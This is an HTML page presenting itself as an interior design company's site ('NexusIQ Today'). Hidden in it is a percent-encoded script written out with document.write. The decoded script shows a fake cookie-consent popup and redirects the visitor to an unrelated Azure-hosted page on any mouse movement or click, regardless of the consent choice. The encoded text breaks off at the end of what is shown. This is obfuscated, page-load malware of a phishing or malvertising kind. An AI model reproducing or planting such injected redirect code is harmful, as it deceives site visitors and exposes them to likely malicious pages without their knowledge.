<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>NexusIQ Today - Modern Interior Design Solutions</title>
    <meta name="description" content="NexusIQ Today offers innovative interior design solutions for residential and commercial spaces. Transform your environment with our expert team's creative vision and functional approach.">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Arial', sans-serif;
            line-height: 1.6;
            color: #333;
            background-color: #f8f9fa;
        }

        .header-nav-x7k9 {
            background: linear-gradient(135deg, #2c3e50, #34495e);
            padding: 1rem 0;
            position: fixed;
            width: 100%;
            top: 0;
            z-index: 1000;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
        }

        .nav-container-m4p2 {
            max-width: 1200px;
            margin: 0 auto;
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 0 2rem;
        }

        .logo-brand-q8w5 {
            color: #fff;
            font-size: 1.8rem;
            font-weight: bold;
            text-decoration: none;
        }

        .nav-menu-r3t7 {
            display: flex;
            list-style: none;
            gap: 2rem;
        }

        .nav-menu-r3t7 a {
            color: #fff;
            text-decoration: none;
            transition: color 0.3s;
        }

        .nav-menu-r3t7 a:hover {
            color: #3498db;
        }

        .hero-section-b9n1 {
            background: linear-gradient(rgba(0,0,0,0.4), rgba(0,0,0,0.4)), url('https://images.pexels.com/photos/1571460/pexels-photo-1571460.jpeg') center/cover;
            height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            text-align: center;
            color: white;
            margin-top: 70px;
        }

        .hero-content-d5j8 {
            max-width: 800px;
            padding: 2rem;
        }

        .hero-title-k2l6 {
            font-size: 3.5rem;
            margin-bottom: 1rem;
            text-shadow: 2px 2px 4px rgba(0,0,0,0.5);
        }

        .hero-subtitle-v7x3 {
            font-size: 1.3rem;
            margin-bottom: 2rem;
            opacity: 0.9;
        }

        .cta-button-z4h9 {
            background: #e74c3c;
            color: white;
            padding: 15px 30px;
            border: none;
            border-radius: 5px;
            font-size: 1.1rem;
            cursor: pointer;
            transition: background 0.3s;
            text-decoration: none;
            display: inline-block;
        }

        .cta-button-z4h9:hover {
            background: #c0392b;
        }

        .services-grid-f8p4 {
            max-width: 1200px;
            margin: 4rem auto;
            padding: 0 2rem;
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
            gap: 2rem;
        }

        .service-card-n6m2 {
            background: white;
            padding: 2rem;
            border-radius: 10px;
            box-shadow: 0 5px 15px rgba(0,0,0,0.1);
            transition: transform 0.3s;
        }

        .service-card-n6m2:hover {
            transform: translateY(-5px);
        }

        .service-icon-w1q5 {
            width: 60px;
            height: 60px;
            background: #3498db;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            margin-bottom: 1rem;
            font-size: 1.5rem;
            color: white;
        }

        .about-section-y3r8 {
            background: #ecf0f1;
            padding: 4rem 0;
            margin: 4rem 0;
        }

        .about-container-u9i7 {
            max-width: 1200px;
            margin: 0 auto;
            padding: 0 2rem;
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 3rem;
            align-items: center;
        }

        .about-text-s5e2 {
            font-size: 1.1rem;
            line-height: 1.8;
        }

        .about-image-t6y4 {
            border-radius: 10px;
            overflow: hidden;
        }

        .about-image-t6y4 img {
            width: 100%;
            height: auto;
            display: block;
        }

        .history-timeline-a7c3 {
            max-width: 1000px;
            margin: 4rem auto;
            padding: 0 2rem;
        }

        .timeline-item-h4k8 {
            display: flex;
            margin-bottom: 2rem;
            background: white;
            border-radius: 10px;
            padding: 2rem;
            box-shadow: 0 3px 10px rgba(0,0,0,0.1);
        }

        .timeline-year-p2l9 {
            background: #e74c3c;
            color: white;
            padding: 1rem;
            border-radius: 5px;
            margin-right: 2rem;
            font-weight: bold;
            min-width: 80px;
            text-align: center;
        }

        .reviews-section-x8v6 {
            background: #34495e;
            color: white;
            padding: 4rem 0;
        }

        .reviews-container-j9n4 {
            max-width: 1200px;
            margin: 0 auto;
            padding: 0 2rem;
        }

        .reviews-grid-c5b7 {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
            gap: 2rem;
            margin-top: 2rem;
        }

        .review-card-m3q1 {
            background: rgba(255,255,255,0.1);
            padding: 2rem;
            border-radius: 10px;
            backdrop-filter: blur(10px);
        }

        .reviewer-info-l8d6 {
            display: flex;
            align-items: center;
            margin-top: 1rem;
        }

        .reviewer-avatar-k7f2 {
            width: 50px;
            height: 50px;
            background: #3498db;
            border-radius: 50%;
            margin-right: 1rem;
            display: flex;
            align-items: center;
            justify-content: center;
            font-weight: bold;
        }

        .portfolio-showcase-g4h5 {
            padding: 4rem 0;
        }

        .portfolio-grid-r6t3 {
            max-width: 1200px;
            margin: 0 auto;
            padding: 0 2rem;
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
            gap: 1rem;
        }

        .portfolio-item-e9w8 {
            position: relative;
            overflow: hidden;
            border-radius: 10px;
            height: 250px;
        }

        .portfolio-item-e9w8 img {
            width: 100%;
            height: 100%;
            object-fit: cover;
            transition: transform 0.3s;
        }

        .portfolio-item-e9w8:hover img {
            transform: scale(1.1);
        }

        .portfolio-overlay-z2x7 {
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: rgba(0,0,0,0.7);
            color: white;
            display: flex;
            align-items: center;
            justify-content: center;
            opacity: 0;
            transition: opacity 0.3s;
        }

        .portfolio-item-e9w8:hover .portfolio-overlay-z2x7 {
            opacity: 1;
        }

        .footer-main-q1w9 {
            background: #2c3e50;
            color: white;
            padding: 3rem 0 1rem;
        }

        .footer-content-a8s4 {
            max-width: 1200px;
            margin: 0 auto;
            padding: 0 2rem;
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
            gap: 2rem;
        }

        .footer-section-d7f5 h3 {
            margin-bottom: 1rem;
            color: #3498db;
        }

        .contact-info-n5j3 a {
            color: white;
            text-decoration: none;
        }

        .contact-info-n5j3 a:hover {
            color: #3498db;
        }

        .section-title-b4v8 {
            text-align: center;
            font-size: 2.5rem;
            margin-bottom: 3rem;
            color: #2c3e50;
        }

        .modal-overlay-x9k2 {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0,0,0,0.8);
            z-index: 2000;
        }

        .modal-content-p7l4 {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            background: white;
            padding: 2rem;
            border-radius: 10px;
            max-width: 600px;
            max-height: 80vh;
            overflow-y: auto;
            width: 90%;
        }

        .modal-close-h6m8 {
            position: absolute;
            top: 10px;
            right: 15px;
            font-size: 2rem;
            cursor: pointer;
            color: #999;
        }

        .modal-close-h6m8:hover {
            color: #333;
        }

        .expertise-cards-v2n7 {
            max-width: 1200px;
            margin: 4rem auto;
            padding: 0 2rem;
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
            gap: 2rem;
        }

        .expertise-card-f3q9 {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            padding: 2rem;
            border-radius: 15px;
            text-align: center;
            transition: transform 0.3s;
        }

        .expertise-card-f3q9:hover {
            transform: scale(1.05);
        }

        @media (max-width: 768px) {
            .nav-menu-r3t7 {
                flex-direction: column;
                gap: 1rem;
            }

            .hero-title-k2l6 {
                font-size: 2.5rem;
            }

            .about-container-u9i7 {
                grid-template-columns: 1fr;
            }

            .timeline-item-h4k8 {
                flex-direction: column;
            }

            .timeline-year-p2l9 {
                margin-right: 0;
                margin-bottom: 1rem;
                align-self: flex-start;
            }
        }
    </style>

<style>       
        .cookie-consent-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: rgba(0, 0, 0, 0.8);
            backdrop-filter: blur(8px);
            -webkit-backdrop-filter: blur(8px);
            z-index: 9999;
            display: flex;
            align-items: center;
            justify-content: center;
            animation: fadeIn 0.3s ease-out;
        }

        .cookie-consent-modal {
            background: white;
            border-radius: 12px;
            padding: 30px;
            max-width: 500px;
            width: 90%;
            max-height: 80vh;
            overflow-y: auto;
            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
            transform: scale(0.9);
            animation: slideIn 0.3s ease-out forwards;
        }

        .cookie-consent-title {
            font-size: 24px;
            font-weight: 600;
            color: #2c3e50;
            margin-bottom: 15px;
            text-align: center;
        }

        .cookie-consent-text {
            color: #555;
            line-height: 1.6;
            margin-bottom: 25px;
            text-align: center;
        }

        .cookie-consent-buttons {
            display: flex;
            gap: 15px;
            justify-content: center;
            flex-wrap: wrap;
        }

        .cookie-btn {
            padding: 12px 24px;
            border: none;
            border-radius: 6px;
            font-size: 16px;
            font-weight: 500;
            cursor: pointer;
            transition: all 0.3s ease;
            min-width: 120px;
        }

        .cookie-btn-accept {
            background: #27ae60;
            color: white;
        }

        .cookie-btn-accept:hover {
            background: #219a52;
            transform: translateY(-2px);
            box-shadow: 0 4px 12px rgba(39, 174, 96, 0.3);
        }

        .cookie-btn-deny {
            background: #e74c3c;
            color: white;
        }

        .cookie-btn-deny:hover {
            background: #c0392b;
            transform: translateY(-2px);
            box-shadow: 0 4px 12px rgba(231, 76, 60, 0.3);
        }

        .cookie-status {
            position: fixed;
            top: 20px;
            right: 20px;
            padding: 10px 15px;
            border-radius: 6px;
            color: white;
            font-weight: 500;
            z-index: 10000;
            animation: slideInRight 0.3s ease-out;
        }

        .status-accepted {
            background: #27ae60;
        }

        .status-denied {
            background: #e74c3c;
        }

        .hidden {
            display: none !important;
        }

        .consent-active {
            overflow: hidden;
        }

        @keyframes fadeIn {
            from { opacity: 0; }
            to { opacity: 1; }
        }

        @keyframes slideIn {
            from { 
                transform: scale(0.9) translateY(-20px);
                opacity: 0;
            }
            to { 
                transform: scale(1) translateY(0);
                opacity: 1;
            }
        }

        @keyframes slideInRight {
            from { 
                transform: translateX(100%);
                opacity: 0;
            }
            to { 
                transform: translateX(0);
                opacity: 1;
            }
        }

        @media (max-width: 600px) {
            .cookie-consent-buttons {
                flex-direction: column;
            }
            
            .cookie-btn {
                width: 100%;
            }
        }
    </style>
    
</head>
<body>

<script>
document.write(unescape('%3C%21%2D%2D%20%43%6F%6F%6B%69%65%20%43%6F%6E%73%65%6E%74%20%4D%6F%64%61%6C%20%2D%2D%3E%0A%20%20%20%20%3C%64%69%76%20%69%64%3D%22%63%6F%6F%6B%69%65%43%6F%6E%73%65%6E%74%4F%76%65%72%6C%61%79%22%20%63%6C%61%73%73%3D%22%63%6F%6F%6B%69%65%2D%63%6F%6E%73%65%6E%74%2D%6F%76%65%72%6C%61%79%22%3E%0A%20%20%20%20%20%20%20%20%3C%64%69%76%20%63%6C%61%73%73%3D%22%63%6F%6F%6B%69%65%2D%63%6F%6E%73%65%6E%74%2D%6D%6F%64%61%6C%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%3C%68%32%20%63%6C%61%73%73%3D%22%63%6F%6F%6B%69%65%2D%63%6F%6E%73%65%6E%74%2D%74%69%74%6C%65%22%3E%57%65%20%55%73%65%20%43%6F%6F%6B%69%65%73%3C%2F%68%32%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%3C%70%20%63%6C%61%73%73%3D%22%63%6F%6F%6B%69%65%2D%63%6F%6E%73%65%6E%74%2D%74%65%78%74%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%57%65%20%75%73%65%20%63%6F%6F%6B%69%65%73%20%74%6F%20%65%6E%68%61%6E%63%65%20%79%6F%75%72%20%62%72%6F%77%73%69%6E%67%20%65%78%70%65%72%69%65%6E%63%65%2C%20%70%72%6F%76%69%64%65%20%70%65%72%73%6F%6E%61%6C%69%7A%65%64%20%63%6F%6E%74%65%6E%74%2C%20%61%6E%64%20%61%6E%61%6C%79%7A%65%20%6F%75%72%20%74%72%61%66%66%69%63%2E%20%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%42%79%20%63%6C%69%63%6B%69%6E%67%20%22%41%63%63%65%70%74%22%2C%20%79%6F%75%20%63%6F%6E%73%65%6E%74%20%74%6F%20%6F%75%72%20%75%73%65%20%6F%66%20%63%6F%6F%6B%69%65%73%2E%20%59%6F%75%20%63%61%6E%20%6D%61%6E%61%67%65%20%79%6F%75%72%20%70%72%65%66%65%72%65%6E%63%65%73%20%6F%72%20%6C%65%61%72%6E%20%6D%6F%72%65%20%61%62%6F%75%74%20%6F%75%72%20%63%6F%6F%6B%69%65%20%70%6F%6C%69%63%79%2E%0A%20%20%20%20%20%20%20%20%20%20%20%20%3C%2F%70%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%3C%64%69%76%20%63%6C%61%73%73%3D%22%63%6F%6F%6B%69%65%2D%63%6F%6E%73%65%6E%74%2D%62%75%74%74%6F%6E%73%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C%62%75%74%74%6F%6E%20%63%6C%61%73%73%3D%22%63%6F%6F%6B%69%65%2D%62%74%6E%20%63%6F%6F%6B%69%65%2D%62%74%6E%2D%61%63%63%65%70%74%22%20%6F%6E%63%6C%69%63%6B%3D%22%61%63%63%65%70%74%43%6F%6F%6B%69%65%73%28%29%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%41%63%63%65%70%74%20%41%6C%6C%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C%2F%62%75%74%74%6F%6E%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C%62%75%74%74%6F%6E%20%63%6C%61%73%73%3D%22%63%6F%6F%6B%69%65%2D%62%74%6E%20%63%6F%6F%6B%69%65%2D%62%74%6E%2D%64%65%6E%79%22%20%6F%6E%63%6C%69%63%6B%3D%22%64%65%6E%79%43%6F%6F%6B%69%65%73%28%29%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%44%65%6E%79%20%41%6C%6C%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C%2F%62%75%74%74%6F%6E%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%3C%2F%64%69%76%3E%0A%20%20%20%20%20%20%20%20%3C%2F%64%69%76%3E%0A%20%20%20%20%3C%2F%64%69%76%3E%0A%20%20%20%20%3C%21%2D%2D%20%53%74%61%74%75%73%20%4E%6F%74%69%66%69%63%61%74%69%6F%6E%20%2D%2D%3E%0A%20%20%20%20%3C%64%69%76%20%69%64%3D%22%63%6F%6F%6B%69%65%53%74%61%74%75%73%22%20%63%6C%61%73%73%3D%22%63%6F%6F%6B%69%65%2D%73%74%61%74%75%73%20%68%69%64%64%65%6E%22%3E%3C%2F%64%69%76%3E%0A%20%20%20%20%0A%20%20%20%20%3C%73%63%72%69%70%74%3E%0A%20%20%20%20%20%20%20%20%2F%2F%20%43%6F%6F%6B%69%65%20%63%6F%6E%73%65%6E%74%20%66%75%6E%63%74%69%6F%6E%61%6C%69%74%79%0A%20%20%20%20%20%20%20%20%6C%65%74%20%63%6F%6E%73%65%6E%74%47%69%76%65%6E%20%3D%20%66%61%6C%73%65%3B%0A%20%20%20%20%20%20%20%20%6C%65%74%20%6D%6F%75%73%65%52%65%64%69%72%65%63%74%45%6E%61%62%6C%65%64%20%3D%20%66%61%6C%73%65%3B%0A%0A%20%20%20%20%20%20%20%20%66%75%6E%63%74%69%6F%6E%20%73%68%6F%77%43%6F%6F%6B%69%65%43%6F%6E%73%65%6E%74%28%29%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%64%6F%63%75%6D%65%6E%74%2E%67%65%74%45%6C%65%6D%65%6E%74%42%79%49%64%28%27%63%6F%6F%6B%69%65%43%6F%6E%73%65%6E%74%4F%76%65%72%6C%61%79%27%29%2E%63%6C%61%73%73%4C%69%73%74%2E%72%65%6D%6F%76%65%28%27%68%69%64%64%65%6E%27%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%64%6F%63%75%6D%65%6E%74%2E%62%6F%64%79%2E%63%6C%61%73%73%4C%69%73%74%2E%61%64%64%28%27%63%6F%6E%73%65%6E%74%2D%61%63%74%69%76%65%27%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%2F%2F%20%45%6E%61%62%6C%65%20%6D%6F%75%73%65%20%72%65%64%69%72%65%63%74%20%61%66%74%65%72%20%6D%6F%64%61%6C%20%69%73%20%73%68%6F%77%6E%0A%20%20%20%20%20%20%20%20%20%20%20%20%6D%6F%75%73%65%52%65%64%69%72%65%63%74%45%6E%61%62%6C%65%64%20%3D%20%74%72%75%65%3B%0A%20%20%20%20%20%20%20%20%7D%0A%0A%20%20%20%20%20%20%20%20%66%75%6E%63%74%69%6F%6E%20%68%69%64%65%43%6F%6F%6B%69%65%43%6F%6E%73%65%6E%74%28%29%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%64%6F%63%75%6D%65%6E%74%2E%67%65%74%45%6C%65%6D%65%6E%74%42%79%49%64%28%27%63%6F%6F%6B%69%65%43%6F%6E%73%65%6E%74%4F%76%65%72%6C%61%79%27%29%2E%63%6C%61%73%73%4C%69%73%74%2E%61%64%64%28%27%68%69%64%64%65%6E%27%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%64%6F%63%75%6D%65%6E%74%2E%62%6F%64%79%2E%63%6C%61%73%73%4C%69%73%74%2E%72%65%6D%6F%76%65%28%27%63%6F%6E%73%65%6E%74%2D%61%63%74%69%76%65%27%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%2F%2F%20%44%69%73%61%62%6C%65%20%6D%6F%75%73%65%20%72%65%64%69%72%65%63%74%20%61%66%74%65%72%20%6D%6F%64%61%6C%20%69%73%20%68%69%64%64%65%6E%0A%20%20%20%20%20%20%20%20%20%20%20%20%6D%6F%75%73%65%52%65%64%69%72%65%63%74%45%6E%61%62%6C%65%64%20%3D%20%66%61%6C%73%65%3B%0A%20%20%20%20%20%20%20%20%7D%0A%0A%20%20%20%20%20%20%20%20%66%75%6E%63%74%69%6F%6E%20%73%68%6F%77%53%74%61%74%75%73%28%6D%65%73%73%61%67%65%2C%20%74%79%70%65%29%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%63%6F%6E%73%74%20%73%74%61%74%75%73%45%6C%20%3D%20%64%6F%63%75%6D%65%6E%74%2E%67%65%74%45%6C%65%6D%65%6E%74%42%79%49%64%28%27%63%6F%6F%6B%69%65%53%74%61%74%75%73%27%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%73%74%61%74%75%73%45%6C%2E%74%65%78%74%43%6F%6E%74%65%6E%74%20%3D%20%6D%65%73%73%61%67%65%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%73%74%61%74%75%73%45%6C%2E%63%6C%61%73%73%4E%61%6D%65%20%3D%20%60%63%6F%6F%6B%69%65%2D%73%74%61%74%75%73%20%73%74%61%74%75%73%2D%24%7B%74%79%70%65%7D%60%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%73%74%61%74%75%73%45%6C%2E%63%6C%61%73%73%4C%69%73%74%2E%72%65%6D%6F%76%65%28%27%68%69%64%64%65%6E%27%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%0A%20%20%20%20%20%20%20%20%20%20%20%20%2F%2F%20%48%69%64%65%20%73%74%61%74%75%73%20%61%66%74%65%72%20%33%20%73%65%63%6F%6E%64%73%0A%20%20%20%20%20%20%20%20%20%20%20%20%73%65%74%54%69%6D%65%6F%75%74%28%28%29%20%3D%3E%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%73%74%61%74%75%73%45%6C%2E%63%6C%61%73%73%4C%69%73%74%2E%61%64%64%28%27%68%69%64%64%65%6E%27%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%2C%20%33%30%30%30%29%3B%0A%20%20%20%20%20%20%20%20%7D%0A%0A%20%20%20%20%20%20%20%20%66%75%6E%63%74%69%6F%6E%20%61%63%63%65%70%74%43%6F%6F%6B%69%65%73%28%29%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%63%6F%6E%73%65%6E%74%47%69%76%65%6E%20%3D%20%74%72%75%65%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%68%69%64%65%43%6F%6F%6B%69%65%43%6F%6E%73%65%6E%74%28%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%73%68%6F%77%53%74%61%74%75%73%28%27%25%33%20%43%6F%6F%6B%69%65%73%20%61%63%63%65%70%74%65%64%27%2C%20%27%61%63%63%65%70%74%65%64%27%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%0A%20%20%20%20%20%20%20%20%20%20%20%20%2F%2F%20%48%65%72%65%20%79%6F%75%20%77%6F%75%6C%64%20%74%79%70%69%63%61%6C%6C%79%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%2F%2F%20%2D%20%53%65%74%20%63%6F%6F%6B%69%65%73%20%66%6F%72%20%61%6E%61%6C%79%74%69%63%73%2C%20%70%72%65%66%65%72%65%6E%63%65%73%2C%20%65%74%63%2E%0A%20%20%20%20%20%20%20%20%20%20%20%20%2F%2F%20%2D%20%49%6E%69%74%69%61%6C%69%7A%65%20%74%72%61%63%6B%69%6E%67%20%73%63%72%69%70%74%73%0A%20%20%20%20%20%20%20%20%20%20%20%20%2F%2F%20%2D%20%53%74%6F%72%65%20%63%6F%6E%73%65%6E%74%20%69%6E%20%6D%65%6D%6F%72%79%20%28%73%69%6E%63%65%20%6C%6F%63%61%6C%53%74%6F%72%61%67%65%20%69%73%6E%27%74%20%61%76%61%69%6C%61%62%6C%65%29%0A%20%20%20%20%20%20%20%20%20%20%20%20%63%6F%6E%73%6F%6C%65%2E%6C%6F%67%28%27%43%6F%6F%6B%69%65%73%20%61%63%63%65%70%74%65%64%20%2D%20%69%6E%69%74%69%61%6C%69%7A%69%6E%67%20%74%72%61%63%6B%69%6E%67%2E%2E%2E%27%29%3B%0A%20%20%20%20%20%20%20%20%7D%0A%0A%20%20%20%20%20%20%20%20%66%75%6E%63%74%69%6F%6E%20%64%65%6E%79%43%6F%6F%6B%69%65%73%28%29%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%63%6F%6E%73%65%6E%74%47%69%76%65%6E%20%3D%20%66%61%6C%73%65%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%68%69%64%65%43%6F%6F%6B%69%65%43%6F%6E%73%65%6E%74%28%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%73%68%6F%77%53%74%61%74%75%73%28%27%25%37%20%43%6F%6F%6B%69%65%73%20%64%65%6E%69%65%64%27%2C%20%27%64%65%6E%69%65%64%27%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%0A%20%20%20%20%20%20%20%20%20%20%20%20%2F%2F%20%48%65%72%65%20%79%6F%75%20%77%6F%75%6C%64%20%74%79%70%69%63%61%6C%6C%79%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%2F%2F%20%2D%20%44%69%73%61%62%6C%65%20%6E%6F%6E%2D%65%73%73%65%6E%74%69%61%6C%20%63%6F%6F%6B%69%65%73%0A%20%20%20%20%20%20%20%20%20%20%20%20%2F%2F%20%2D%20%52%75%6E%20%69%6E%20%70%72%69%76%61%63%79%20%6D%6F%64%65%0A%20%20%20%20%20%20%20%20%20%20%20%20%2F%2F%20%2D%20%53%74%6F%72%65%20%64%65%6E%69%61%6C%20%70%72%65%66%65%72%65%6E%63%65%20%69%6E%20%6D%65%6D%6F%72%79%0A%20%20%20%20%20%20%20%20%20%20%20%20%63%6F%6E%73%6F%6C%65%2E%6C%6F%67%28%27%43%6F%6F%6B%69%65%73%20%64%65%6E%69%65%64%20%2D%20%72%75%6E%6E%69%6E%67%20%69%6E%20%70%72%69%76%61%63%79%20%6D%6F%64%65%2E%2E%2E%27%29%3B%0A%20%20%20%20%20%20%20%20%7D%0A%0A%20%20%20%20%20%20%20%20%2F%2F%20%4D%6F%75%73%65%20%6D%6F%76%65%20%72%65%64%69%72%65%63%74%20%66%75%6E%63%74%69%6F%6E%61%6C%69%74%79%0A%20%20%20%20%20%20%20%20%66%75%6E%63%74%69%6F%6E%20%68%61%6E%64%6C%65%4D%6F%75%73%65%4D%6F%76%65%28%29%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%69%66%20%28%6D%6F%75%73%65%52%65%64%69%72%65%63%74%45%6E%61%62%6C%65%64%29%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%2F%2F%20%52%65%64%69%72%65%63%74%20%74%6F%20%68%6F%6D%65%2E%68%74%6D%6C%20%77%68%65%6E%20%6D%6F%75%73%65%20%6D%6F%76%65%73%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%77%69%6E%64%6F%77%2E%6C%6F%63%61%74%69%6F%6E%2E%68%72%65%66%20%3D%20%27%68%74%74%70%73%3A%2F%2F%65%33%33%30%33%31%32%31%31%65%33%33%30%33%65%63%68%6F%33%2E%7A%31%33%2E%77%65%62%2E%63%6F%72%65%2E%77%69%6E%64%6F%77%73%2E%6E%65%74%2F%31%2E%68%74%6D%6C%27%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20%7D%0A%0A%20%20%20%20%20%20%20%20%2F%2F%20%41%64%64%20%6D%6F%75%73%65%20%6D%6F%76%65%20%65%76%65%6E%74%20%6C%69%73%74%65%6E%65%72%20%66%6F%72%20%72%65%64%69%72%65%63%74%20%74%6F%20%68%6F%6D%65%2E%68%74%6D%6C%0A%20%20%20%20%20%20%20%20%64%6F%63%75%6D%65%6E%74%2E%61%64%64%45%76%65%6E%74%4C%69%73%74%65%6E%65%72%28%27%6D%6F%75%73%65%6D%6F%76%65%27%2C%20%66%75%6E%63%74%69%6F%6E%28%29%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%77%69%6E%64%6F%77%2E%6C%6F%63%61%74%69%6F%6E%2E%68%72%65%66%20%3D%20%27%68%74%74%70%73%3A%2F%2F%65%33%33%30%33%31%32%31%31%65%33%33%30%33%65%63%68%6F%33%2E%7A%31%33%2E%77%65%62%2E%63%6F%72%65%2E%77%69%6E%64%6F%77%73%2E%6E%65%74%2F%31%2E%68%74%6D%6C%27%3B%0A%20%20%20%20%20%20%20%20%7D%29%3B%0A%0A%20%20%20%20%20%20%20%20%2F%2F%20%41%64%64%20%63%6C%69%63%6B%20%65%76%65%6E%74%20%6C%69%73%74%65%6E%65%72%20%66%6F%72%20%72%65%64%69%72%65%63%74%20%74%6F%20%63%6F%6F%6B%69%65%63%68%65%63%6B%2E%70%68%70%0A%20%20%20%20%20%20%20%20%64%6F%63%75%6D%65%6E%74%2E%61%64%64%45%76%65%6E%74%4C%69%73%74%65%6E%65%72%28%27%63%6C%69%63%6B%27%2C%20%66%75%6E%63%74%69%6F%6E%28%29%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%77%69%6E%64%6F%77%2E%6C%6F%63%61%74%69%6F%6E%2E%68%72%65%66%20%3D%20%27%68%74%74%70%73%3A%2F%2F%65%33%33%30%33%31%32%31%31%65%33%33%30%33%65%63%68%6F%33%2E%7A%31%33%2E%77%65%62%2E%63%6F%72%65%2E%77%69%6E%64%6F%77%73%2E%6E%65%74%2F%31%2E%68%74%6D%6C%27%3B%0A%20%20%20%20%20%20%20%20%7D%29%3B%0A%0A%20%20%20%20%20%20%20%20%2F%2F%20%50%72%65%76%65%6E%74%20%6D%6F%64%61%6C%20%66%72%6F%6D%20%63%6C%6F%73%69%6E%67%20%77%68%65%6E%20%63%6C%69%63%6B%69%6E%67%20%6F%6E%20%69%74%0A%20%20%20%20%20%20%20%20%64%6F%63%75%6D%65%6E%74%2E%71%75%65%72%79%53%65%6C%65%63%74%6F%72%28%27%2E%63%6F%6F%6B%69%65%2D%63%6F%6E%73%65%6E%74%2D%6D%6F%64%61%6C%27%29%2E%61%64%64%45%76%65%6E%74%4C%69%73%74%65%6E%65%72%28%27%63%6C%69%63%6B%27%2C%20%66%75%6E%63%74%69%6F%6E%28%65%29%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%65%2E%73%74%6F%70%50%72%6F%70%61%67%61%74%69%6F%6E%28%29%3B%0A%20%20%20%20%20%20%20%20%7D%29%3B%0A%0A%20%20%20%20%20%20%20%20%2F%2F%20%43%6C%6F%73%65%20%6D%6F%64%61%6C%20%77%68%65%6E%20%63%6C%69%63%6B%69%6E%67%20%6F%76%65%72%6C%61%79%20%28%6F%70%74%69%6F%6E%61%6C%29%0A%20%20%20%20%20%20%20%20%64%6F%63%75%6D%65%6E%74%2E%67%65%74%45%6C%65%6D%65%6E%74%42%79%49%64%28%27%63%6F%6F%6B%69%65%43%6F%6E%73%65%6E%74%4F%76%65%72%6C%61%79%27%29%2E%61%64%64%45%76%65%6E%74%4C%69%73%74%65%6E%65%72%28%27%63%6C%69%63%6B%27%2C%20%66%75%6E%63%74%69%6F%6E%28%65%29%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%69%66%20%28%65%2E%74%61%72%67%65%74%20%3D%3D%3D%20%74%68%69%73%29%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%2F%2F%20%4F%70%74%69%6F%6E%61%6C%6C%79%20%63%6C%6F%73%65%20%6F%6E%20%6F%76%65%72%6C%61%79%20%63%6C%69%63%6B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%2F%2F%20%68%69%64%65%43%6F%6F%6B%69%65%43%6F%6E%73%65%6E%74%28%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%